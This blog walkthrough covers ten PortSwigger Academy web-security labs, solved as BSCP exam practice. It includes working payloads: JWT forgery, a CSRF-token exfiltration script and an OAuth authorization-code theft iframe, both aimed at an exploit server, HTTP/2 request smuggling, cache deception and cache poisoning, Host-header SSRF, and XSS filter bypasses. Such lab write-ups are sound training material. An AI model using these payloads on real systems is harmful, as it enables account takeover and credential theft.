---
layout: post
title: "Ten Rolls Into Step Two: The Second Rehearsal for the Exam"
date: 2026-11-27
categories: [web-security, walkthrough]
tags: [portswigger, bscp, mystery-lab, burp-suite, jwt, csrf, web-cache-poisoning, http-request-smuggling, oauth, ssrf, host-header, broken-authentication]
excerpt: "Ten more Mystery Pool labs in one sitting, this time privilege escalation — and the moment that mattered most was realizing a Content-Security-Policy had blocked my script from firing, not that the page had quietly escaped it away."
lang: en
page_id: ten-rolls-step-two
permalink: /posts/ten-rolls-step-two/
---

My first payload came back looking dead. `foo@example.com"><img src= onerror=alert(1)>`, dropped into an email field, reflected on the account page — and nothing happened. The honest reaction was "escaped, move on." It wasn't escaped. It was sitting there in the DOM, a real `<img>` tag, doing nothing because a Content-Security-Policy header had just told the browser to ignore every inline event handler on the page. Those are two completely different bugs with two completely different fixes, and for about two minutes I was solving the wrong one.

This is test two of three: ten more [Mystery Pool]({% post_url 2026-10-04-mystery-pool %}) labs rolled back to back, no skipping, repeats included, same rules as [step one]({% post_url 2026-11-25-ten-rolls-step-one %}). This time it's privilege escalation — the stage where the foothold already exists and the question is how far a low-privileged account can be pushed into someone else's.

## The rules of the test

Same deal as last time: every privilege-escalation topic in the Mystery Pool ticked, Practitioner difficulty, ten rolls, no skipping, duplicates counted the same as everything else. Total time: about two hours, start to finish, for all ten. Unlike the first test, nothing ate the whole session this time — the two hours were spread fairly evenly across re-deriving filters, reading oracles, and chasing headers roll after roll, with no single lab turning into a twenty-minute standoff. Tools: Burp Scanner, Intruder, Repeater, Decoder, the JWT Editor and HTTP Request Smuggler extensions, Param Miner, and my [BSCP cheatsheet](https://github.com/matteo-brandolino/bscp-exam-notes). No community write-ups this time — every lab got identified and solved from the request/response in front of me.

## Scoreboard

| # | Lab / topic | Repeat? | Outcome |
|---|---|---|---|
| 1 | JWT authentication bypass via `jwk` self-signed header | No | Solved |
| 2 | CSRF via dangling-markup `formaction` button injection, CSP-blocked XSS escalated into token exfiltration | No | Solved, one dead end (plain `<img onerror>`, mistaken for escaping) |
| 3 | Web cache deception exploiting origin-server normalization | No | Solved |
| 4 | Response queue poisoning via H2.TE request smuggling | No | Solved, one dead end (raw HTTP/1.1 probe rejected — front-end is HTTP/2-only) |
| 5 | Authentication bypass via encryption oracle | No | Solved |
| 6 | Reflected XSS with tag/event filter bypass (`<body onresize>`) | No | Solved |
| 7 | Routing-based SSRF via the Host header | No | Solved |
| 8 | Change-password broken logic (missing `current-password` skips the check) | No | Solved, one dead end (wrong lab guessed: password brute-force via password change) |
| 9 | Web cache poisoning via a duplicated `Host` header | No | Solved |
| 10 | OAuth account takeover via unvalidated `redirect_uri` | **Yes** (2026-11-18) | Solved, recognized instantly |

## The session

### Roll 1 — A key the server never asked to see (JWT authentication bypass via `jwk`)

A JWT in the `session` cookie, header `alg: RS256` and a `kid`, payload `sub: wiener`. A targeted Scanner run on just that cookie insertion point — not a crawl — flagged **"JWT self-signed JWK header supported"** immediately, confidence certain.

The bug: the server accepts a public key embedded directly in the token's own `jwk` header and verifies the signature against *that* key, instead of looking up `kid` in a fixed, server-side trusted keystore. If the server will check a signature against whatever key you hand it, the signature stops proving anything.

With the **JWT Editor** extension: generate a new RSA keypair the server has never seen, edit the token to add a `jwk` header pointing at the new key's public half, change `sub` to `administrator`, sign with the matching private key through the extension. Sent as the `session` cookie on `GET /admin`, it worked — the server had nothing to compare the embedded key against except itself. Stage 2, non-interactive, no delivery needed — this is entirely a conversation between the attacker and the server.

### Roll 2 — The payload that wasn't dead, just silenced (CSRF via dangling markup, CSP bypass)

An "update email" feature, first guess CSRF — Scanner found nothing there, which is normal; CSRF needs manual confirmation, not an automated hit. Pivoted to XSS on the same field. `foo@example.com"><img src= onerror=alert(1)>` reflected on the account page and the alert never fired. Read that as encoding doing its job and moved on — wrong reading, and it cost a few minutes before the actual cause surfaced: the markup wasn't being stripped at all, a Content-Security-Policy was just refusing to execute any inline event handler on the page. Two different failure modes that look identical from the outside: a payload that's gone, and a payload that's present but muzzled.

Once that was clear, the fix was obvious: stop trying to execute anything. `<button formaction="..." formmethod="get">` is a form control, not a script — no CSP directive blocks it by default:

```
https://TARGET.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://EXPLOIT-SERVER.exploit-server.net/exploit" formmethod="get">Click me</button>
```

Injected inside the page's *real* email-change form (which already has a hidden CSRF token field), this button overrides where that form submits without touching any of its other fields. A click sends the whole form — token included — as a GET to the exploit server. CSP stopped me from running code; it did nothing to stop me from adding a new way to submit an existing form.

Delivery, two stages on the same exploit-server script: first visit redirects the victim to the crafted `my-account` URL carrying the button; their click leaks their own CSRF token into the exploit server's log via the query string; a second load of the same script sees that token already present and auto-submits a hidden form changing their email to `hacker@evil-user.net`.

```html
<body>
<script>
const academyFrontend = "https://TARGET.web-security-academy.net/";
const exploitServer = "https://EXPLOIT-SERVER.exploit-server.net/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');
    token.name = 'csrf'; token.value = csrf;
    email.name = 'email'; email.value = 'hacker@evil-user.net';
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email); form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

Stage 2, interactive (one click needed), delivered via the exploit server.

### Roll 3 — Two readers of the same URL, disagreeing (web cache deception via origin normalization)

`/my-account` shows an API key. Fuzzed the path with Intruder looking for a suffix that both resolves to the sensitive page *and* reads as static to whatever's caching it. `/aaa/..%2fmy-account` — an encoded `../` — came back `200` with the key: the origin server decodes and resolves the dot-segment, collapsing the fake prefix and serving `/my-account` as if that had been the request all along.

Separately, every static resource on the site lives under `/resources/`, and responses under that prefix show caching. Combine the two: `/resources/..%2fmy-account?wcd`. The cache sees `/resources/...` and caches on sight, never looking past the prefix. The origin normalizes the `..%2f` and serves the real, authenticated `/my-account` page. Two components, two different opinions about what that URL points to, and the gap between them is the whole bug.

```html
<script>document.location="https://TARGET.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
```

Victim loads this, their browser (their session) requests the crafted path, their authenticated response gets cached under it. Request the same path with no session at all, and the cache hands back the victim's own page, API key included. Stage 2, interactive (one page load from the victim), delivered via the exploit server, non-interactive on the attacker's retrieval side.

### Roll 4 — The 404 that proved it was working (response queue poisoning via H2.TE smuggling)

Scanner flagged HTTP request smuggling, confidence only **tentative** — the generic advisory text, no committed variant. Its own proof-of-concept showed both `Transfer-Encoding: chunked` and `Content-Length` on the same HTTP/2 request, which is the classic desync shape but not, by itself, proof of which header wins where.

Tried the textbook manual CL.TE probe as raw HTTP/1.1 in Repeater and got an immediate `400 Bad Request`, `"Protocol error"`. First guess: a malformed `Host` header. Fixed the formatting, same error. The actual cause: this front-end only speaks HTTP/2 to begin with — a request forced into literal HTTP/1.1 text gets rejected before the CL/TE ambiguity is ever parsed. The classic probes assume an HTTP/1.1 front-end; here the desync lives specifically in the HTTP/2-to-HTTP/1.1 downgrade, so the probe has to travel *as* HTTP/2.

Switched to the HTTP Request Smuggler extension's HTTP/2 probe set, which confirmed **"HTTP/2 TE desync v10a options"** — a named variant, not a guess. The exploit is one HTTP/2 stream carrying a `Transfer-Encoding: chunked` header it should never be allowed to carry, body `0\r\n\r\n` (an immediately-closed chunk) followed by a second, complete request appended after it:

```http
POST / HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net
```

The back-end, reading plain HTTP/1.1 over the reused connection, sees two requests where the front-end only opened one stream. Sent once, then a second ordinary request came back `404` — not an error, *confirmation*: that second request received the response meant for the smuggled, nonexistent `/x`, proof the response queue is now off by exactly one entry.

From there it's pure timing: fire the same poisoning request in a loop with Intruder, filter out the boring 2xx/4xx/5xx noise, and wait for whoever's real traffic reuses that connection next to have their response handed to you instead of them. Request 110 out of the run:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=SqXrdAFP1OOTMwVVB95bLxTVoqPCnghe; Secure; HttpOnly; SameSite=None
```

The administrator's own login redirect, session cookie attached, handed to a request that had nothing to do with the admin at all. Swapped the cookie in, entered the admin panel, deleted carlos. Stage 2, non-interactive — the entire capture is attacker-sent requests exploiting ordinary connection reuse, no click from anyone required.

### Roll 5 — Borrowing the cipher from the wrong feature (authentication bypass via encryption oracle)

Logging in sets a `stay-logged-in` cookie, clearly encrypted. A comment form's email validation reflects the submitted value in cleartext on error: `Invalid email address: test.com`. Posting a comment also sets a `notification` cookie — and the two features, comment validation and login persistence, turned out to share the same cipher and key.

That shared cipher cuts both ways. `GET /post?postId=x`'s `notification` cookie, fed arbitrary ciphertext, decrypts it and reflects the plaintext in the error message — a decrypt oracle. `POST /post/comment`'s `email` field, fed arbitrary plaintext, returns the matching ciphertext in the `notification` `Set-Cookie` — an encrypt oracle. Feeding the real `stay-logged-in` cookie into the decrypt oracle revealed the format: `wiener:1598530205184`, username and expiry timestamp, nothing more.

Feeding `administrator:<timestamp>` straight into the encrypt oracle doesn't give a clean result — the server always prepends a fixed 23-byte string, `Invalid email address: `, before encrypting, and the cipher works in 16-byte blocks. 23 isn't a multiple of 16; padding the chosen input with 9 junk characters first makes the unwanted prefix exactly 32 bytes — two whole blocks, removable cleanly in Decoder without corrupting anything after it (cut a block cipher's output anywhere *except* a block boundary and the rest turns to garbage). Trim those 32 bytes from both the decrypt-test and the real forged ciphertext, drop the result in as `stay-logged-in`, and the server reads `administrator:<timestamp>` as if it had generated the cookie itself. Logged in as administrator, deleted carlos.

Stage 2, non-interactive — the entire attack is two oracles on the same app, in conversation with themselves through me.

### Roll 6 — A filter with exactly one hole (reflected XSS, tag/event bypass)

A canary payload in the `search` parameter reflected raw, unencoded — but a filter was clearly blocking something, since the obvious payloads weren't landing. Rather than guess tag by tag, Intruder fuzzed a tag-name wordlist against the parameter first — `body` survived — then an event-handler wordlist against that surviving tag — `onresize` survived. Everything else obvious (`script`, `img`/`onerror`, `onload`) was presumably gone.

`onresize` only fires when the element's box actually changes size, which means the delivery page has to manufacture that resize itself:

```html
<iframe src="https://TARGET.web-security-academy.net/?search=%22%3E%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100px'">
```

The injected `">` breaks out of the `search` reflection, `<body onresize=print()>` plants the handler, and the iframe's own `onload` immediately shrinks its width — triggering the resize, which triggers the handler, which fires `print()` in the victim's browser. Stage 1-shaped bug, used here as the privilege-escalation payload: non-script-filter bypass plus a context-triggered event instead of a user gesture. Interactive (victim has to load the page), delivered via the exploit server.

### Roll 7 — One header deciding where the request actually goes (routing-based SSRF via Host header)

Scanner's **External service interaction (HTTP)** fired on eight separate URLs at once — `/login`, `/my-account`, `/product`, several static resource paths — which is the tell that the vulnerable input isn't page-specific. It was the `Host` header itself: swap it for a Collaborator domain and the server makes an actual outbound request to it on every page, not just reflects it into a link.

That's SSRF, but the more useful version here is **routing-based**: send an absolute-URL request line (keeping the public, allowed domain) with a mismatched `Host` pointing at a private IP.

```http
GET https://TARGET.web-security-academy.net/admin HTTP/2
Host: 192.168.0.20
```

Front-end and back-end disagree about which of the two URLs is authoritative, and that disagreement routes the request to internal infrastructure the browser has no path to on its own. Fuzzed `192.168.0.§1-255§` with Intruder in the `Host` position until one answered for `/admin` instead of a connection error — `192.168.0.20`, serving a genuine internal admin panel with a delete-user form, CSRF token included. Replayed the same trick as a `POST` with that token and `username=carlos`. Stage 2, non-interactive, no victim anywhere in the chain — every step is the attacker's own request to the same public endpoint, just with a header that changes where it actually lands.

### Roll 8 — The field that only matters if you send it (change-password broken logic)

A change-password form, same credentials as always. First instinct: this is the password-brute-force-via-password-change lab, where the endpoint lacks the login form's lockout. Tried brute-forcing the current password through it — nothing, because that wasn't the bug here at all, just a surface-level resemblance to a different lab I'd solved before.

The actual flaw: the request carries `current-password`, `new-password-1`, `new-password-2`, and a `username`. Removing `current-password` entirely — not blanking it, not tampering with it, just leaving it out — skips the verification step outright:

```http
POST /my-account/change-password HTTP/2
Host: TARGET.web-security-academy.net

csrf=TOKEN&username=administrator&new-password-1=test&new-password-2=test
```

The server accepted it. Administrator's password is now `test`, with no proof the old one was ever known. Logged in, deleted carlos. Stage 2, non-interactive. The lesson underneath the dead end: a check that only runs when its input is present isn't a check, it's a suggestion — and the absence of a field can bypass more cleanly than any value you could put in it.

### Roll 9 — Which Host wins? The script tag believed the second one (web cache poisoning, duplicated Host header)

A response with caching visible in its headers. Sending **two** `Host` headers in the same request caused the page's `<script src="//SECOND-HOST/js/tracking.js">` to be built from the *second* value — whatever constructs that absolute URL reads the last Host header it sees, while the cache in front of it presumably keys on the first (or ignores the duplication as a single value). Host a malicious `tracking.js` on the exploit server, set the second `Host` to that domain, and the poisoned response — tracking script now pointing at the attacker — gets cached for everyone:

```http
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Host: EXPLOIT-SERVER.exploit-server.net
```

A plain follow-up request, no trick involved, confirmed it: `X-Cache: hit`, the script tag now reading `src="//EXPLOIT-SERVER.exploit-server.net/resources/js/tracking.js"`. Every ordinary visitor loading the home page while that cache entry is alive now fetches the attacker's script — the same blast radius as a stored XSS, delivered through infrastructure instead of a database field. Stage 1-shaped mechanism doing stage-2 work here (full script control over any visitor's session), non-interactive once poisoned.

### Roll 10 — The one I'd already solved (OAuth account takeover via unvalidated `redirect_uri`)

The authorization request had no validation on `redirect_uri` at all:

```http
GET /auth?client_id=CLIENT_ID&redirect_uri=example.com&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-TARGET.oauth-server.net
```

```http
HTTP/2 302 Found
Location: example.com?code=NTAQaQlIKLbMEScPVdthA5OPeSW2SrldR81UbOVujje
```

`redirect_uri` set to an arbitrary, non-attacker-controlled domain, and the server redirected there anyway, authorization code attached. I'd solved this exact shape of bug on this blog before — this is a genuine repeat, the same lab logic as a [post from a few weeks back]({% post_url 2026-11-18-three-rolls-nothing-on-screen %}) — and it showed in the clock: zero investigation, straight to delivery.

```html
<iframe src="https://oauth-TARGET.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://EXPLOIT-SERVER.exploit-server.net/&response_type=code&scope=openid%20profile%20email"></iframe>
```

Victim loads this, their browser gets redirected to the exploit server with their authorization code attached, the code lands in the exploit server's access log. Intercept your own login attempt at the real callback, swap your code for the stolen one, forward it, log in as the victim. Stage 2, interactive, delivered via the exploit server.

## The pattern

The thread running through most of these ten isn't about identity cookies this time — it's one layer underneath them. **Two components that are supposed to agree on the same piece of data instead read it differently, and the gap between their two readings is the exploit.** The cache and the origin disagree about what a normalized path points to (roll 3) and about which `Host` header is the real one (roll 9). The front-end and back-end disagree about where an HTTP/2 request actually ends (roll 4). A filter blocks `onerror` but not `onresize` — the filter and the attacker disagree about what counts as dangerous, and only one of them is right (roll 6). A browser's CSP and its DOM disagree about whether injected markup is dangerous — CSP blocks execution, not injection, and that's a real distinction with real exploitable space in between (roll 2). None of these bugs live in a single broken check; they live in the seam between two things that were each individually reasonable on their own.

A second, smaller thread: **a verification step that only runs if you hand it something to verify.** Roll 1's server checks a signature against whatever key you embed instead of a fixed keystore — supply your own key, and the "check" becomes a formality you control. Roll 8's server checks a current password only if that field exists in the request at all — omit it, and there's nothing left to fail. In both cases the fix a developer reaches for first — "verify properly" — was technically present. What was missing was pinning *what* gets verified against to something the attacker can't also hand over.

## Exam and field

**In the exam**, the fastest tells from this run: a scanner issue firing across many unrelated URLs at once (roll 7) means the vulnerable input is global, not page-specific — check headers before parameters. A `Transfer-Encoding`/`Content-Length` pair on an HTTP/2 request with only "Tentative" confidence means confirm manually before building the exploit-stage request — and if a classic HTTP/1.1 CL.TE/TE.CL probe gets an immediate protocol error instead of a timeout, suspect an HTTP/2-only front-end before suspecting a typo in your own header. A reflected value that "doesn't execute" needs one extra question before you give up on it: encoded away, or just blocked from running? The two look identical in the browser and need completely different next moves. And a change-password or account-action request with a suspiciously named "current value" field is worth testing by deletion, not just tampering — the absence of a parameter breaks more logic than a wrong value in it ever does.

**In the field**, these ten sit at genuinely different points on the blast-radius scale despite all technically living in "privilege escalation." The web cache poisoning (roll 9) and the duplicated-Host SSRF (roll 7) scale to every visitor or every internal endpoint respectively, with zero victim interaction; the JWT and encryption-oracle bugs (rolls 1, 5) are direct, deterministic account takeovers once the cryptographic assumption is broken; the CSRF, cache-deception, XSS, and OAuth rolls (2, 3, 6, 10) all need one specific victim to load one specific page, which narrows them in practice but doesn't make them any less complete once that happens. The shared defensive lesson: whenever two systems — a cache and an origin, a front-end and a back-end, a comment form and a login cookie — share infrastructure or trust each other's output, that shared surface needs its own review, separate from either system's individual logic.

## What comes next

The third and final test is the last BSCP stage: data exfiltration — XXE, SSRF used for exfiltration rather than routing, SSTI, path traversal, file upload, deserialization, OS command injection. Same rule as the first two: ten rolls, no skipping, duplicates counted exactly as they land.

## Takeaways

- A reflected payload that doesn't fire might be blocked from executing, not stripped from the page — Content-Security-Policy and output encoding are two different defenses, and only one of them stops markup from landing at all.
- When a cache and an origin server, or a front-end and a back-end, each resolve the same URL or request in their own way, look for the gap between those two interpretations before looking for a bug in either one alone.
- A verification step is only as strong as what it's pinned against — a signature checked against an attacker-supplied key, or a check that only runs when its input is present, both fail the same way: by trusting the attacker to supply the thing being verified.
- When a classic manual probe (CL.TE, TE.CL) returns an immediate protocol error instead of the expected delay, question the protocol assumption behind the probe before questioning your own request syntax.
- Recognizing a bug instantly because you've solved its exact shape before isn't luck — it's the actual return on having rolled the wheel enough times.

## Useful references

- [PortSwigger Web Security Academy: JWT](https://portswigger.net/web-security/jwt) · [CSRF](https://portswigger.net/web-security/csrf) · [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning) · [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling) · [Authentication](https://portswigger.net/web-security/authentication) · [HTTP Host header attacks](https://portswigger.net/web-security/host-header) · [OAuth authentication](https://portswigger.net/web-security/oauth) · [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) · [SSRF](https://portswigger.net/web-security/ssrf)
- [Three rolls, nothing on screen — the first time this OAuth bug showed up]({% post_url 2026-11-18-three-rolls-nothing-on-screen %})
- [Ten rolls into step one — the first test in this series]({% post_url 2026-11-25-ten-rolls-step-one %})
- [Mystery Pool]({% post_url 2026-10-04-mystery-pool %})
- [My BSCP exam notes](https://github.com/matteo-brandolino/bscp-exam-notes)

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
